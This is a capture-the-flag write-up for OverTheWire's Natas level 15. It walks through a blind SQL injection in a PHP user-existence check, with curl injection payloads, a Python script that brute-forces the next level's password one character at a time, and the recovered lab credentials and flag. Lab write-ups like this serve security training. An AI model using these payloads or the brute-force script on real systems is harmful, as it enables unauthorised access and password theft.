# Level 15
## What does the page look like?
```html
$ curl -s --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
## Source code
```html
$ curl -s --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
	    if(mysql_num_rows($res) > 0) {
	        echo "This user exists.<br>";
	    } else {
	        echo "This user doesn't exist.<br>";
	    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Vulnerability and Exploitation
### Find a valid username
Providing a username allows to confirm the existence of a user:
~~~~
$ curl -s -d 'username=natas16' -X POST --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug | html2text

****** natas15 ******
Executing query: SELECT * from users where username="natas16"
This user exists.
View_sourcecode
~~~~
### Confirm the SQL injection
Now we know that the `natas16` user exists in the table.

The user input field (`username`) is not sanitized by the PHP script, making SQL injections possible:
~~~~
$ curl -s -d 'username=" or "1"="1' -X POST --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug | html2text 

****** natas15 ******
Executing query: SELECT * from users where username="" or "1"="1"
This user exists.
View_sourcecode
~~~~
### UNION SELECT injection

`UNION SELECT` seems to have been disabled on the server because it fails:
~~~~
$ curl -s -d 'username=natas16" union select 1,2' -X POST --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/?debug | html2text

****** natas15 ******
Executing query: SELECT * from users where username="natas16" union select 1,2"
Error in query.
View_sourcecode
~~~~
### Brute forcing the password
After trying some other techniques and failing, let's try to brute force the password of username `natas16`. *Note: we suppose here that the password is stored unencrypted in the database and will only contain alphanumeric values ([a-zA-Z0-9])*

To do that, we will guess the password for each letter with such queries:
~~~~
SELECT * FROM user WHERE username="natas16" AND password LIKE BINARY "a%"
~~~~
*Notice that we are using `BINARY` to make sure this will be case sensitive*

It will check if the password starts with `a`. If this is the case, the request should return the string `This user exists`. Else, we will get `This user doesn't exist`.

Once we have found the first letter (let's say it's `X`). We will test the second letter using the second position:
~~~~
SELECT * FROM user WHERE username="natas16" AND password LIKE BINARY "Xa%"
~~~~
And so on, until we have the password.

Below is my python code:
```python
#!/usr/bin/env python
import requests

auth_user = 'natas15'
auth_pwd = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
target = "http://natas15.natas.labs.overthewire.org/?debug"

password = ''

# We know the password is 32 characters long
for pos in range(33):
	for i in range(48,123):
		# only include a-z, A-Z and 0-9
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			sqli = {'username': 'natas16" AND password LIKE BINARY "%s%s%%' % (password, chr(i))}
			r = requests.post(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				data = sqli
				)
			if "This user exists" in r.text:
				# Once letter is found, it is added to the password and we jump to the next letter
				password += chr(i)
				print(password)
				break
```
Here is the output:
~~~~
$ python bruteforce.py 
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
~~~~

# Flag
~~~~
natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
~~~~
